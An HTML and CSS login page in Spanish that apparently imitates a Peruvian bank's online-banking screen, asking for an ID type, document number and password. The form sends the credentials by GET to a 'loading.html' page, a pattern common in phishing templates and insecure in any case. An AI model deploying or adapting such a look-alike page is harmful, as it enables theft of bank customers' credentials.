<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pantalla Login Responsive</title>

<style>
    :root {
        --bg-desktop: url("img/bpi_bg_lg_x2.jpg");
        --bg-mobile: url("img/bpi_bg_sm_x2.jpg");
        --accent: #32A3C1;
        --btn-light: #6acb8c;
        --btn-green: #009b38;
    }

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial;
    }

    body {
        width: 100vw;
        height: 100vh;
        overflow: hidden;
        background: var(--bg-desktop) no-repeat center center;
        background-size: cover;
        display: flex;
        align-items: center;
        justify-content: flex-start;
        position: relative;
    }

    .bluee-img {
        position: absolute;
        top: 20px;
        right: 40px;
        width: 250px;
        height: auto;
        z-index: 5;
    }

    .card {
        width: 420px;
        background: white;
        padding: 32px 28px 48px;
        border-radius: 28px 28px 40px 40px;
        margin-left: 60px;
        box-shadow:
            0px 30px 60px rgba(0,0,0,0.35),
            0px 10px 25px rgba(0,0,0,0.20);
        position: relative;
    }

    form { margin: 0; }

    /* === Campo Documento === */
    .field-group { margin-bottom: 26px; }
    .top-row {
        display: flex;
        align-items: flex-end;
        gap: 14px;
    }

    .select-wrap {
        width: 70px;
        position: relative;
        padding-bottom: 6px;
        border-bottom: 1px solid #d9d9d9;
    }

    .select-wrap select {
        width: 100%;
        border: none;
        background: none;
        font-size: 15px;
        outline: none;
        appearance: none;
        cursor: pointer;
        color: #444;
    }

    .select-wrap::after {
        content: "▾";
        position: absolute;
        right: 0;
        top: 50%;
        transform: translateY(-50%);
        font-size: 12px;
        color: #777;
    }

    .input-wrap { position: relative; flex: 1; }

    .input-wrap input {
        width: 100%;
        border: none;
        border-bottom: 1px solid #d9d9d9;
        padding: 10px 0 6px;
        font-size: 15px;
        color: #333;
        background: transparent;
        outline: none;
    }

    .floating-label {
        position: absolute;
        left: 0;
        top: 50%;
        transform: translateY(-50%);
        font-size: 15px;
        color: #bfbfbf;
        pointer-events: none;
        transition: all 0.18s ease;
    }

    .input-wrap input:focus + .floating-label,
    .input-wrap input:not(:placeholder-shown) + .floating-label {
        top: 0;
        transform: translateY(-100%);
        font-size: 12px;
        color: var(--accent);
    }

    .input-wrap input:focus {
        border-bottom: 2px solid var(--accent);
    }

    /* === Contraseña === */
    .pw-label {
        font-size: 14px;
        color: #b0b0b0;
        margin-bottom: 6px;
    }

    .pw-row {
        display: flex;
        align-items: center;
        border-bottom: 1px solid #ddd;
        padding-bottom: 6px;
        margin-bottom: 16px;
        position: relative;
    }

    .pw-row input {
        width: 100%;
        border: none;
        outline: none;
        font-size: 15px;
        color: #444;
        background: none;
        padding-right: 34px;
    }

    .eye {
        position: absolute;
        right: 0;
        top: 50%;
        transform: translateY(-50%);
        width: 22px;
        cursor: pointer;
    }

    .eye img { width: 22px; }

    .remember {
        display: flex;
        align-items: center;
        gap: 10px;
        margin-bottom: 25px;
    }

    .remember input {
        width: 18px;
        height: 18px;
        cursor: pointer;
    }

    /* === Botón === */
    .btn {
        width: 50%;
        height: 40px;
        background: var(--btn-light);
        color: white;
        padding: 0;
        border: none;
        border-radius: 4px;
        font-size: 18px;
        cursor: not-allowed;
        box-shadow: 0 6px 14px rgba(0,0,0,0.18);
        opacity: 0.8;
        transition: 0.2s ease;
    }

    .btn.btn-active {
        background: var(--btn-green);
        cursor: pointer;
        opacity: 1;
    }

    .btn.btn-active:active {
        transform: translateY(1px);
        box-shadow: 0 3px 8px rgba(0,0,0,0.25);
    }

    .bottom-bar {
        width: 420px;
        background: linear-gradient(to right, #1c7254, #054d63);
        color: white;
        font-size: 14px;
        padding: 12px 18px;
        border-radius: 0 0 40px 40px;
        position: absolute;
        bottom: 0;
        left: 0;
        display: flex;
        gap: 20px;
    }

    .bottom-bar a {
        color: white;
        text-decoration: none;
    }

    /* ===== Mobile ===== */
    @media (max-width: 768px) {
        body {
            background: var(--bg-mobile) no-repeat center center;
            background-size: cover;
            flex-direction: column;
            justify-content: flex-start;
            align-items: center;
            padding-top: 20px;
        }

        .bluee-img {
            position: relative;
            width: 200px;
            top: 0;
            right: auto;
            margin-bottom: 10px;
        }

        .card {
            width: 90%;
            max-width: 420px;
            margin-left: 0;
            padding: 28px 22px 56px;
        }

        .bottom-bar {
            width: 100%;
            border-radius: 0 0 32px 32px;
            padding: 12px 22px;
            font-size: 13px;
            gap: 14px;
        }
    }
</style>
</head>
<body>

<img class="bluee-img" src="img/bluee.svg" alt="">

<div class="card">
    <form action="loading.html" method="GET">

        <!-- Documento -->
        <div class="field-group">
            <div class="top-row">
                <div class="select-wrap">
                    <select name="tipo_doc">
                        <option value="dni">DNI</option>
                        <option value="ce">CE</option>
                        <option value="pasaporte">Pasaporte</option>
                    </select>
                </div>

                <div class="input-wrap">
                    <input
                        type="tel"
                        id="docNumber"
                        name="numero_documento"
                        inputmode="numeric"
                        pattern="[0-9]*"
                        placeholder=" "
                    >
                    <label for="docNumber" class="floating-label">Número de documento</label>
                </div>
            </div>
        </div>

        <!-- Contraseña -->
        <div class="pw-label">Contraseña</div>

        <div class="pw-row">
            <input id="password" type="password" name="password">
            <div class="eye" id="togglePassword">
                <img src="img/eye-open.png" alt="Mostrar contraseña">
            </div>
        </div>

        <label class="remember">
            <input type="checkbox" name="remember">
            <span>Recordar documento</span>
        </label>

        <center>
            <button class="btn" id="submitBtn" type="submit" disabled>Siguiente</button>
        </center>

    </form>

    <div class="bottom-bar">
        <a href="#">Regístrate</a> |
        <a href="#">Olvidé mi contraseña</a> |
        <a href="#">Ayuda</a>
    </div>
</div>

<script>
    /* === Mostrar / Ocultar Contraseña === */
    const passwordInput = document.getElementById('password');
    const toggle = document.getElementById('togglePassword');
    const eyeImg = toggle.querySelector('img');

    const eyeOpenSrc = 'img/eye-open.png';
    const eyeClosedSrc = 'img/eye-closed.png';

    toggle.addEventListener('click', () => {
        const isHidden = passwordInput.type === 'password';
        passwordInput.type = isHidden ? 'text' : 'password';
        eyeImg.src = isHidden ? eyeClosedSrc : eyeOpenSrc;
    });

    /* === Activación del botón === */
    const docInput = document.getElementById('docNumber');
    const submitBtn = document.getElementById('submitBtn');

    function sanitizeAndValidate() {
        docInput.value = docInput.value.replace(/\D/g, '');

        const hasDoc = docInput.value.length >= 4;
        const hasPwd = passwordInput.value.length >= 4;

        if (hasDoc && hasPwd) {
            submitBtn.disabled = false;
            submitBtn.classList.add('btn-active');
        } else {
            submitBtn.disabled = true;
            submitBtn.classList.remove('btn-active');
        }
    }

    docInput.addEventListener('input', sanitizeAndValidate);
    passwordInput.addEventListener('input', sanitizeAndValidate);
</script>

</body>
</html>
